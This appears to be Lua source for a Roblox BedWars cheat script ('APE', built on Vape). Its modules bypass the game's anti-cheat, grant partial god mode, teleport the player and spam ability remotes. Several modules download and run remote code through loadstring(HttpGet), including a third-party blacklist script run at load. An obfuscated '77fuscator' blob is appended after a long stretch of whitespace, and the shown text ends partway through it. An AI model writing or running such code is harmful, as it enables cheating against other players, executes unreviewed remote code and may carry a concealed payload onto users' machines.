		local HeartBeatConnect2 = tick()
		local Value = HeartBeatConnect2 - (HeartBeatConnect2 - HeartBeatConnect <= 999 and 0 or 999)
		HeartBeatConnect = math.max(HeartBeatConnect,Value)
	end
	Disabler = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AnticheatBypassV2",
	    HoverText = "better AnticheatBypass reel",
        Function = function(callback)
            if callback then
				SendNotify = true
				NoDisable = true
				task.spawn(function()
					repeat
						task.wait()
						RenderSteppedConnection = game:GetService("RunService").RenderStepped:Connect(getRenderStepped)
						HeartbeatConnection = game:GetService("RunService").Heartbeat:Connect(getHeartBeat)
						local item = getItemNear("scythe")
						repeat task.wait() until item
						if item and lplr.Character.HandInvItem.Value == item.tool and bedwars.CombatController then
							if DisablerMode.Value == "MoveDirection" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection
									})
								end
							elseif DisablerMode.Value == "LookVector" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector
									})
								end
							end
							if entityLibrary.isAlive and entityLibrary.character.Head.Transparency ~= 0 then
								bedwarsStore.scythe = tick() + 1
							end
						elseif item and lplr.Character.HandInvItem.Value ~= item.tool and bedwars.CombatController then
							if SendNotify then
								if DisablerNotify.Value == "Vape" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
								elseif DisablerNotify.Value == "Print" then
									print(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Warn" then
									warn(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Combined" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
									print(DisablerTable.Messages.Context3)
									warn(DisablerTable.Messages.Context3)
								end
								SendNotify = false
							end
							if DisablerMissing.Value == "Continue" then
								task.wait(DisablerTable.Values.Duration)
								SendNotify = true
								NoDisable = true
							elseif DisablerMissing.Value == "Disable" then
								NoDisable = false
							end
							if not NoDisable then
								Disabler.ToggleButton(false)
								return
							end
						elseif not item then
							if DisablerNotify.Value == "Vape" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
							elseif DisablerNotify.Value == "Print" then
								print(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Warn" then
								warn(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Combined" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
								print(DisablerTable.Messages.Context4)
								warn(DisablerTable.Messages.Context4)
							end
							Disabler.ToggleButton(false)
							return
						end
					until not Disabler.Enabled
				end)
			else
				HeartbeatConnection:Disconnect()
				RenderSteppedConnection:Disconnect()
            end
        end,
		ExtraText = function()
			return DisablerMode.Value
		end
    })
	DisablerMode = Disabler.CreateDropdown({
		Name = "Mode",
		List = {
			"MoveDirection",
			"LookVector"
		},
		HoverText = "Disabler Mode",
		Function = function() end,
	})
	DisablerMissing = Disabler.CreateDropdown({
		Name = "Missing Scythe",
		List = {
			"Continue",
			"Disable"
		},
		HoverText = "Actions that will occur when the Scythe is missing",
		Function = function() end,
	})
	DisablerNotify = Disabler.CreateDropdown({
		Name = "Notification",
		List = {
			"Vape",
			"Print",
			"Warn",
			"Combined"
		},
		HoverText = "Notification that will be displayed",
		Function = function() end,
	})
	DisablerDuration = Disabler.CreateSlider({
		Name = "Duration",
		Min = 1,
		Max = 10,
		HoverText = "Notification's Duration",
		Function = function() end,
		Default = 5
	})
	DisablerSpeedVal = Disabler.CreateSlider({
		Name = "Speed",
		Min = 1,
		Max = 100,
		HoverText = "Direction Speed",
		Function = function() end,
		Default = 90
	})
	DisablerSpeed = Disabler.CreateToggle({
		Name = "Speed",
		Default = true,
		HoverText = "Adds speed to the direction",
		Function = function() end,
	})
	DisablerNotification = Disabler.CreateToggle({
		Name = "Notification",
		Default = true,
		HoverText = "Notifies you when certain actions happen",
		Function = function() end,
	})
end)

local Nebula = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
	["Name"] = "NebulaSky",
	["Function"] = function(callback)
		if callback then
			task.spawn(function() 

				local Vignette = true


				local Lighting = game:GetService("Lighting")
				local ColorCor = Instance.new("ColorCorrectionEffect")
				local SunRays = Instance.new("SunRaysEffect")
				local Sky = Instance.new("Sky")
				local Atm = Instance.new("Atmosphere")


				for i, v in pairs(Lighting:GetChildren()) do
					if v then
						v:Destroy()
					end
				end

				ColorCor.Parent = Lighting
				SunRays.Parent = Lighting
				Sky.Parent = Lighting
				Atm.Parent = Lighting

				if Vignette == true then
					local Gui = Instance.new("ScreenGui")
					Gui.Parent = StarterGui
					Gui.IgnoreGuiInset = true

					local ShadowFrame = Instance.new("ImageLabel")
					ShadowFrame.Parent = Gui
					ShadowFrame.AnchorPoint = Vector2.new(0,1,0)
					ShadowFrame.Position = UDim2.new(0,0,0,0)
					ShadowFrame.Size = UDim2.new(0,0,0,0)
					ShadowFrame.BackgroundTransparency = 1
					ShadowFrame.Image = ""
					ShadowFrame.ImageTransparency = 1
					ShadowFrame.ZIndex = 0
				end


				ColorCor.Brightness = 0.1
				ColorCor.Contrast = 0.5
				ColorCor.Saturation = -0.3
				ColorCor.TintColor = Color3.fromRGB(255, 235, 203)

				SunRays.Intensity = 0.075
				SunRays.Spread = 0.727

				Sky.SkyboxBk = "rbxassetid://13581437029"
				Sky.SkyboxDn = "rbxassetid://13581439832"
				Sky.SkyboxFt = "rbxassetid://13581447312"
				Sky.SkyboxLf = "rbxassetid://13581443463"
				Sky.SkyboxRt = "rbxassetid://13581452875"
				Sky.SkyboxUp = "rbxassetid://13581450222"
				Sky.SunAngularSize = 10

				Lighting.Ambient = Color3.fromRGB(2,2,2)
				Lighting.Brightness = 0.3
				Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
				Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
				Lighting.EnvironmentDiffuseScale = 0.2
				Lighting.EnvironmentSpecularScale = 0.2
				Lighting.GlobalShadows = true
				Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
				Lighting.ShadowSoftness = 0.2
				Lighting.ClockTime = 15
				Lighting.GeographicLatitude = 45
				Lighting.ExposureCompensation = 0.5

				Atm.Density = 0.364
				Atm.Offset = 0.556
				Atm.Color = Color3.fromRGB(179, 59, 249)
				Atm.Decay = Color3.fromRGB(155, 212, 255)
				Atm.Glare = 0.36
				Atm.Haze = 1.72	
                end)
			end
		end
    })

runFunction(function()
		local Reinject = {["Enabled"] = false}
		Reinject = GuiLibrary["ObjectsThatCanBeSaved"]["APEWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Reinject",
			["HoverText"] = "Reinjects Vape To Load Modules",
			   ["Function"] = function(Callback)
					Enabled = Callback
					if Enabled then
						Reinject["ToggleButton"](false)
						GuiLibrary["SelfDestruct"]()
						loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
	
	
					end
				end
		})
	end)

runFunction(function()
   Pink = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
	["Name"] = "PinkTheme",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				for i,v in pairs(lightingService:GetChildren()) do
					if v:IsA("Atmosphere") or v:IsA("Sky") or v:IsA("PostEffect") then
						v:Remove()
					end
				end
				local sky = Instance.new("Sky")
				sky.SkyboxBk = "rbxassetid://1546230803"
				sky.SkyboxDn = "rbxassetid://1546231143"
				sky.SkyboxFt = "rbxassetid://1546230803"
				sky.SkyboxLf = "rbxassetid://1546230803"
				sky.SkyboxRt = "rbxassetid://1546230803"
				sky.SkyboxUp = "rbxassetid://1546230451"
				sky.Parent = lightingService
				pcall(function() workspace.Clouds:Destroy() end)
				local damagetab = debug.getupvalue(bedwars.DamageIndicator, 2)
				damagetab.strokeThickness = false
				damagetab.textSize = 32
				damagetab.blowUpDuration = 0
				damagetab.baseColor = Color3.fromRGB(255, 132, 178)
				damagetab.blowUpSize = 32
				damagetab.blowUpCompleteDuration = 0
				damagetab.anchoredDuration = 0
				debug.setconstant(bedwars.DamageIndicator, 83, Enum.Font.LuckiestGuy)
				debug.setconstant(bedwars.DamageIndicator, 102, "Enabled")
				debug.setconstant(bedwars.DamageIndicator, 118, 0.3)
				debug.setconstant(bedwars.DamageIndicator, 128, 0.5)
				debug.setupvalue(bedwars.DamageIndicator, 10, {
					Create = function(self, obj, ...)
						task.spawn(function()
							obj.Parent.Parent.Parent.Parent.Velocity = Vector3.new((math.random(-50, 50) / 100) * damagetab.velX, (math.random(50, 60) / 100) * damagetab.velY, (math.random(-50, 50) / 100) * damagetab.velZ)
							local textcompare = obj.Parent.TextColor3
							if textcompare ~= Color3.fromRGB(85, 255, 85) then
								local newtween = tweenService:Create(obj.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
									TextColor3 = (textcompare == Color3.fromRGB(76, 175, 93) and Color3.new(0, 0, 0) or Color3.new(0, 0, 0))
								})
								task.wait(0.15)
								newtween:Play()
							end
						end)
						return tweenService:Create(obj, ...)
					end
				})
				local colorcorrection = Instance.new("ColorCorrectionEffect")
				colorcorrection.TintColor = Color3.fromRGB(255, 199, 220)
				colorcorrection.Brightness = 0.05
				colorcorrection.Parent = lightingService
				debug.setconstant(require(lplr.PlayerScripts.TS.controllers.global.hotbar.ui.healthbar["hotbar-healthbar"]).HotbarHealthbar.render, 16, 16745650)
			end)
		end
	end
})
end)

runFunction(function()
        local FlyGui = {Enabled = false}
        FlyGui = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
            Name = "FlyLoader",
            HoverText = "Loads FlyGui credits to Red",
            Function = function(callback)
                if callback then
                    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        loadstring(game:HttpGet(('https://pastebin.com/raw/h5QDPy6s'),true))()
						FlyGui.ToggleButton(false)
						warningNotification("APE", "Fly Gui Should Be Loaded Up", 5)
					else
                end
            end
		end
    })
end)

	runFunction(function()
		local InfiniteYield = {Enabled = false}
		InfiniteYield = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "InfiniteYield",
			Function = function(callback)
				if callback then
					task.spawn(function()
					loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
					InfiniteYield["ToggleButton"](false)
					warningNotification("APE", "Loaded Infinite Yield!", 5)
					end)
				end
			end,
			HoverText = "infinite yield lel"
		})
	end)

runFunction(function()
	local AnimationPlayer = {Enabled = false}
	local AnimationPlayerBox = {Value = "11335949902"}
	local AnimationPlayerSpeed = {Speed = 1}
	local playedanim
	AnimationPlayer = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
		Name = "InvisibleExploit",
		HoverText = "put you underground",
		Function = function(callback)
			if callback then 
				if entityLibrary.isAlive then 
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
                        lplr.Character.Humanoid.CameraOffset = Vector3.new(0, 3 / -2, 0)
                        lplr.Character.HumanoidRootPart.Size = Vector3.new(2, 3, 1.1)
						
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(0 / 10)
						table.insert(AnimationPlayer.Connections, playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end))
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end
				table.insert(AnimationPlayer.Connections, lplr.CharacterAdded:Connect(function()
					repeat task.wait() until entityLibrary.isAlive or not AnimationPlayer.Enabled
					task.wait(0.5)
					if not AnimationPlayer.Enabled then return end
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(AnimationPlayerSpeed.Value / 10)
						playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end)
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end))
			else
				if playedanim then playedanim:Stop() playedanim = nil end
			end
		end
	})
end)

	runFunction(function()
		local HostPanelExploit = {Enabled = false}
		local oldhostattribute = nil
		HostPanelExploit = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "VisualHostPanel",
			HoverText = "only visual",
			Function = function(callback)
				task.spawn(function()
					if oldhostattribute == nil then 
						oldhostattribute = (lplr:GetAttribute("Cohost") or lplr:GetAttribute("Host")) and true or false
					end
					if not callback and bedwars.ClientStoreHandler:getState().Game.customMatch and oldhostattribute then 
						return
					end
					lplr:SetAttribute("Cohost", callback)
				end)
			end
		})
	end)

runFunction(function()
    local AutoSkywars = {Enabled = false}
    AutoSkywars = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AutoSkywars",
	HoverText = "tp you to middle sometimes works (only skywars)",
        Function = function(callback)
            if callback then
                task.spawn(function()
                    if bedwarsStore.queueType:find("skywars") then
                        if bedwarsStore.matchState ~= 0 then return end
                        repeat task.wait() until bedwarsStore.matchState ~= 0
                        if (not AutoSkywars.Enabled) then return end
                        task.wait(0.1)
                        local tween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {CFrame = workspace.SpectatorPlatform.floor.CFrame - Vector3.new(0,1.5,5)})
                        tween:Play()
                        tween.Completed:Wait()
                        task.wait(0.5)
                        workspace.SpectatorPlatform.floor.CanCollide = false
                    end
                end)
            end
        end
    })
end)

function IsAlive(plr)
    plr = plr or lplr
    if not plr.Character then return false end
    if not plr.Character:FindFirstChild("Head") then return false end
    if not plr.Character:FindFirstChild("Humanoid") then return false end
    if plr.Character:FindFirstChild("Humanoid").Health < 0.11 then return false end
    return true
end

runFunction(function()
    local GodMode = {Enabled = false}
    GodMode = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "PartialGodMode",
        Function = function(callback)
            if callback then
				spawn(function()
					while task.wait() do
						if (not GodMode.Enabled) then return end
						if (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) then
							for i, v in pairs(game:GetService("Players"):GetChildren()) do
								if v.Team ~= lplr.Team and IsAlive(v) and IsAlive(lplr) then
									if v and v ~= lplr then
										local TargetDistance = lplr:DistanceFromCharacter(v.Character:FindFirstChild("HumanoidRootPart").CFrame.p)
										if TargetDistance < 25 then
											if not lplr.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity") then
												repeat task.wait() until bedwarsStore.matchState ~= 0
												if not (v.Character.HumanoidRootPart.Velocity.Y < -10*5) then
													lplr.Character.Archivable = true
			
													local Clone = lplr.Character:Clone()
													Clone.Parent = workspace
													Clone.Head:ClearAllChildren()
													gameCamera.CameraSubject = Clone:FindFirstChild("Humanoid")
				
													for i,v in pairs(Clone:GetChildren()) do
														if string.lower(v.ClassName):find("part") and v.Name ~= "HumanoidRootPart" then
															v.Transparency = 1
														end
														if v:IsA("Accessory") then
															v:FindFirstChild("Handle").Transparency = 1
														end
													end
				
													lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0,100000,0)
				
													game:GetService("RunService").RenderStepped:Connect(function()
														if Clone ~= nil and Clone:FindFirstChild("HumanoidRootPart") then
															Clone.HumanoidRootPart.Position = Vector3.new(lplr.Character.HumanoidRootPart.Position.X, Clone.HumanoidRootPart.Position.Y, lplr.Character.HumanoidRootPart.Position.Z)
														end
													end)
				
													task.wait(0.3)
													lplr.Character.HumanoidRootPart.Velocity = Vector3.new(lplr.Character.HumanoidRootPart.Velocity.X, -1, lplr.Character.HumanoidRootPart.Velocity.Z)
													lplr.Character.HumanoidRootPart.CFrame = Clone.HumanoidRootPart.CFrame
													gameCamera.CameraSubject = lplr.Character:FindFirstChild("Humanoid")
													Clone:Destroy()
													task.wait(0.15)
												end
											end
										end
									end
								end
							end
						end
					end
				end)
			end
        end
    })
end)

	runFunction(function()
		local AutoEmber = {Enabled = false}
		AutoEmber = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "4BigGuysExploit",
			HoverText = "Automatically uses the ember ability.",
			Function = function(callback)
				if callback then 
					task.spawn(function()
						repeat 
							local saber = getItem("infernal_saber")
							if killauraNearPlayer and saber then 
								bedwars.ClientHandler:Get("HellBladeRelease"):SendToServer({chargeTime = 0.5, player = lplr, weapon = saber.tool})
							end
							task.wait()
						until not AutoEmber.Enabled
					end)
				end
			end
		})
	end)
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/blacklisted.lua"))()

warningNotification("APE", "Loaded Succesfully By RayHafz!", 5)
																																																																						
do local a=[[77fuscator 0.5.0 - discord.gg/CEHsVcBcuf]];return(function(b,c,d,e,f,f,g,h,i,j,k,l,l,m,n,o,p,q,r,s,t,u,u,v,w,w,x,y,y,z,z,z,ba,ba,bb,bb,bb,bc)local bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br,bs,bt,bu,bv,bw,bx,by,bz,ca,cb,cc,cd,ce,cf,cg,ch,ci,cj,ck,cl,cm,cn,co,cp,cq,cr=0 while true do if bd<=17 then if bd<=8 then if bd<=3 then if bd<=1 then if 1~=bd then be,bf,bg,bh,bi,bj,bk=string.sub,table.concat,string.char,tonumber,next,((table.create or function(cs,ct)local cu,cv=0 while true do if cu<=1 then if 1>cu then cv={}else for cw=1,cs do cv[cw]=ct;end;end else if 2==cu then return cv;else break end end cu=cu+1 end end))or tostring else bl=1 end else if bd<3 then bm=function(bi)local bk,cs,ct,cu,cv,cw,cx,cy=0 while true do if bk<=5 then if bk<=2 then if bk<=0 then cs,ct=g,g else if bk~=2 then cu=bj(#bi)else cv=256 end end else if bk<=3 then cw=bj(cv)else if 5~=bk then for bj=0,cv-1 do cw[bj]=bg(bj)end else cx=1 end end end else if bk<=8 then if bk<=6 then cy=function()local bj,cz,da=0 while true do if bj<=2 then if bj<=0 then cz=bh(be(bi,cx,cx),36)else if 2~=bj then cx=(cx+1)else da=bh(be(bi,cx,(cx+cz-1)),36)end end else if bj<=3 then cx=(cx+cz)else if bj==4 then return da else break end end end bj=bj+1 end end else if 7==bk then cs=bg(cy())else cu[1]=cs end end else if bk<=9 then while(cx<#bi)and not(#a~=d)do local a=cy()if cw[a]then ct=cw[a]else ct=cs..be(cs,1,1)end cw[cv]=cs..be(ct,1,1)cu[#cu+1],cs,cv=ct,ct,cv+1 end else if 11~=bk then return bf(cu)else break end end end end bk=bk+1 end end else bn=bm(b)end end else if bd<=5 then if bd<5 then bo={}else c={s,j,w,q,i,l,u,m,x,o,k,y,nil,nil,nil};end else if bd<=6 then bp=v else if 7<bd then br,bs=1,((-18732+(function()local a,b,c,d=0 while true do if a<=1 then if 0<a then d=(function(q,s,v,w)local x=0 while true do if 0<x then break else s(s(v,q,w,v),s(s,q,v,w),v(v and q,s,q,w),q(s,w and s,s,v))end x=x+1 end end)(function(q,s,v,w)local x=0 while true do if x<=2 then if x<=0 then if(b>273)then return v end else if 2~=x then b=(b+1)else c=((c-302)%38578)end end else if x<=3 then if((c%1082)<541 or(c%1082)==541)then c=(((c-450))%6710)return v(q(v,w,v,s)and s(w and w,q,s,v),q(q and v,v,q and q,s),(s(q,s,v and q,v)and q(s,q,v,s)),w(w,(v and v),v,(s and q))and q(w,v,q,s))else return v end else if x~=5 then return v else break end end end x=x+1 end end,function(q,s,v,w)local x=0 while true do if x<=2 then if x<=0 then if(b>126)then return w end else if x>1 then c=((c*89))%27233 else b=b+1 end end else if x<=3 then if(c%252)>=126 then c=(c+522)%31934 return q(w(s,s,q,q),(q(s,v,s,q)and q(v,w,q,q)),w(q and s,w,w,(q and q)),w(s and v,s,w,q))else return w end else if x==4 then return w else break end end end x=x+1 end end,function(q,s,v,w)local x=0 while true do if x<=2 then if x<=0 then if(b>466)then return v end else if 2>x then b=b+1 else c=((c+726)%36001)end end else if x<=3 then if((c%1218)<=609)then c=(c+317)%49859 return v else return v(q(w and s,s,w,(s and q)),s(v,w,q,q),q(s,s,s,v),v(s,s,q,s and q)and v(q,w,v and q,s))end else if x>4 then break else return q(w(q,v,q,v and w),q(q,s,v,(q and q)),w(v,q,v,v),q((q and s),v,q,v))end end end x=x+1 end end,function(q,s,v,w)local x=0 while true do if x<=2 then if x<=0 then if b>415 then return w end else if 2>x then b=b+1 else c=(c*41)%43282 end end else if x<=3 then if((c%320)>=160)then return q else return s(w(q,s,w,q),v(w,w,w and v,v),q(w,v,(v and w),q and s),v(v,s,q,s))end else if 4==x then return q((s(s,v,w and v,s)and w(w,s,q,q)),v(w,(w and v),q,w),s(s,w,q,v),s(v,s,s,s))else break end end end x=x+1 end end)else b,c=0,1 end else if 2<a then break else return c;end end a=a+1 end end)()))else bq=bp(bo)end end end end else if bd<=12 then if bd<=10 then if bd~=10 then bt={}else bu=function(a,b)local c,d=0 while true do if c<=1 then if c~=1 then d=0 else for q=0,31 do local s=(a%2)local v=(b%2)if not(s~=0)then if not(v~=1)then b=b-1 d=(d+2^q)end else a=(a-1)if not(v~=0)then d=(d+(2^q))else b=(b-1)end end b=b/2 a=a/2 end end else if 3~=c then return d else break end end c=c+1 end end end else if bd>11 then bw=function()local a,b,c=0 while true do if a<=1 then if 1>a then b,c=h(bn,br,br+2)else b,c=bu(b,bs),bu(c,bs);end else if a<=2 then br=br+2;else if a~=4 then return((bv(c,8))+b);else break end end end a=a+1 end end else bv=function(a,b)local c=0 while true do if c<1 then return(a*(2^b));else break end c=c+1 end end end end else if bd<=14 then if bd>13 then bx=bt else do for a,b in o,l(bl)do bt[a]=b;end;end;end else if bd<=15 then by=function(a,b)local c=0 while true do if 0==c then return p(a/(2^b));else break end c=c+1 end end else if 16==bd then bz=(2^32-1)else ca=function(a,b)local c=0 while true do if 1>c then return((((a+b))-bu(a,b)))/2 else break end c=c+1 end end end end end end end else if bd<=26 then if bd<=21 then if bd<=19 then if bd<19 then cb=bw()else cc=function(a,b)local c=0 while true do if c<1 then return bz-ca(bz-a,bz-b)else break end c=c+1 end end end else if bd==20 then cd=function(a,b,c)local d=0 while true do if d<1 then if c then local c=((a/2^(b-1))%2^((c-1)-(b-1)+1))return c-c%1 else local b=2^(b-1)return((a%(b+b)>=b)and 1 or 0)end else break end d=d+1 end end else ce=bw()end end else if bd<=23 then if bd~=23 then cf=function()local a,b,c,d,p=0 while true do if a<=1 then if a==0 then b,c,d,p=h(bn,br,br+3)else b,c,d,p=bu(b,cb),bu(c,cb),bu(d,cb),bu(p,cb);end else if a<=2 then br=(br+4);else if 4~=a then return(bv(p,24)+bv(d,16)+bv(c,8))+b;else break end end end a=a+1 end end else cg=function()local a,b=0 while true do if a<=1 then if a==0 then b=bu(h(bn,br,br),cb)else br=br+1;end else if a==2 then return b;else break end end a=a+1 end end end else if bd<=24 then ch,ci,cj=nil else if 26>bd then ch=((-14488+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz=0 while true do if a<=10 then if a<=4 then if a<=1 then if a>0 then c=48533 else b=526 end else if a<=2 then d=3 else if a~=4 then p=270 else q=540 end end end else if a<=7 then if a<=5 then s=12318 else if 7>a then v=385 else w=137 end end else if a<=8 then x=35083 else if a==9 then y=254 else be=340 end end end end else if a<=15 then if a<=12 then if 11<a then bg=170 else bf=2 end else if a<=13 then bh=19255 else if 15~=a then bi=1 else bj=423 end end end else if a<=18 then if a<=16 then bk=240 else if a==17 then bs=0 else bw,by=bs,bi end end else if a<=19 then bz=(function(ca,cc)local ce=0 while true do if 1~=ce then cc(ca(ca,ca)and ca(ca,ca),cc(cc,(ca and ca))and cc(ca,cc))else break end ce=ce+1 end end)(function(ca,cc)local ce=0 while true do if ce<=2 then if ce<=0 then if bw>bk then local bk=bs while true do bk=(bk+bi)if not(bk~=bi)then return cc else break end end end else if 2>ce then bw=(bw+bi)else by=((by-bj)%bh)end end else if ce<=3 then if((by%be)<bg)then local be=bs while true do be=(be+bi)if((be>bf)or be==bf)then if(be<d)then return cc(ca(ca,(ca and cc)),cc(ca,ca))else break end else by=(by+y)%x end end else local x=bs while true do x=(x+bi)if(x<bf)then return cc else break end end end else if ce<5 then return ca else break end end end ce=ce+1 end end,function(x,y)local be=0 while true do if be<=2 then if be<=0 then if(bw>w)then local w=bs while true do w=w+bi if not(w~=bf)then break else return x end end end else if 2~=be then bw=bw+bi else by=((by*v)%s)end end else if be<=3 then if((by%q)>p)then local p=bs while true do p=(p+bi)if(p==bi or p<bi)then by=(by*b)%c else if not(not(p==d))then break else return x(y(x,y),x(y,x))end end end else local b=bs while true do b=b+bi if(b<bf)then return x else break end end end else if be~=5 then return y else break end end end be=be+1 end end)else if 20==a then return by;else break end end end end end a=a+1 end end)()));else ci=(-25303+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca=0 while true do if a<=0 then b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca=0 else if 1<a then break else while true do if(b<10 or b==10)then if(b==4 or b<4)then if b<=1 then if b~=1 then c=40425 else d=236 end else if(b==2 or b<2)then p=960 else if(4>b)then q=1920 else s=33223 end end end else if(b<7 or b==7)then if b<=5 then v=2 else if not(7==b)then w=894 else x=201 end end else if(b<=8)then y=3 else if not(b==10)then be=1330 else bf=5906 end end end end else if b<=15 then if b<=12 then if(11<b)then bh=665 else bg=617 end else if(b==13 or b<13)then bi=211 else if not(b~=14)then bj=33389 else bk=787 end end end else if(b<=18)then if(b==16 or b<16)then bs=1 else if 18>b then bw=0 else by,bz=bw,bs end end else if(b==19 or b<19)then ca=(function(cc,ce)local cs,ct=0 while true do if cs<=0 then ct=0 else if 2~=cs then while true do if not(ct~=0)then ce(ce(cc,cc),cc(ce,ce))else break end ct=ct+1 end else break end end cs=cs+1 end end)(function(cc,ce)local cs,ct=0 while true do if cs<=0 then ct=0 else if cs~=2 then while true do if(ct<2 or ct==2)then if(ct<0 or ct==0)then if(by>bi)then local bi=bw while true do bi=(bi+bs)if not(not(bi==bs))then return ce else break end end end else if(1==ct)then by=(by+bs)else bz=((bz-bk)%bj)end end else if ct<=3 then if((bz%be)<bh)then local be=bw while true do be=(be+bs)if((not(be~=bs)or be<bs))then bz=((bz*bg))%bf else if not(not(be==y))then break else return ce(ce(ce,ce),(cc(ce,ce)and ce(cc,ce)))end end end else local be=bw while true do be=(be+bs)if not(not(be==v))then break else return ce end end end else if ct<5 then return ce else break end end end ct=ct+1 end else break end end cs=cs+1 end end,function(be,bf)local bg,bh=0 while true do if bg<=0 then bh=0 else if 2>bg then while true do if(bh<2 or bh==2)then if(bh<0 or bh==0)then if((by>x))then local x=bw while true do x=((x+bs))if not(not(x==v))then break else return bf end end end else if not(bh~=1)then by=((by+bs))else bz=(((bz+w)%s))end end else if(bh==3 or bh<3)then if(((bz%q)>p))then local p=bw while true do p=(p+bs)if(((p<bs)or not(p~=bs)))then bz=((bz*d)%c)else if not(not(not(p~=y)))then break else return bf(be(be,bf and be),bf(bf,be))end end end else local c=bw while true do c=(c+bs)if(c>bs)then break else return be end end end else if not(5==bh)then return be else break end end end bh=(bh+1)end else break end end bg=bg+1 end end)else if 20==b then return bz;else break end end end end end b=b+1 end end end a=a+1 end end)());end end end end else if bd<=31 then if bd<=28 then if bd>27 then ck=function()local a,b,c,d,p,q,s=0 while true do if a<=3 then if a<=1 then if a~=1 then b,c=cf(),cf()else if b==0 and c==0 then return 0;end;end else if a<3 then d=1 else p=(cd(c,1,20)*((2^32)))+b end end else if a<=5 then if 4<a then s=(((-1)^cd(c,32)))else q=cd(c,21,31)end else if a<=6 then if(not(q~=0))then if(not(p~=0))then return(s*0);else q=1;d=0;end;elseif(not(q~=2047))then if((p==0))then return 